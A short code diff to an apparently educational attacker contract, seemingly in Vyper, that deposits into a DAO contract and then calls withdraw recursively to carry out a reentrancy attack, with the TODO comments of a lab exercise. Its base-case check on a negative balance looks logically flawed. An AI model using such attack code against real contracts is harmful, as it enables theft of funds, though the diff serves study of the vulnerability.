@@ -20,7 +20,7 @@ def _attack() -> bool:
     # Make sure you add a "base case" to end the recursion
     if(self.dao_address.balance < 0):
         return False
-    DAO(dao_address).withdraw(value=100)
+    DAO(self.dao_address).withdraw(value=100)
 
     return True
 
@@ -37,9 +37,9 @@ def attack(dao_address:address):
     # TODO: make the deposit into the DAO
     DAO(dao_address).deposit(value=deposit_amount)
     
-    is_attack = True
+    self.is_attack = True
     # TODO: Start the reentrance attack
-    if(is_attack == True):
+    if(self.is_attack == True):
         #_attack = false
         self._attack()
 
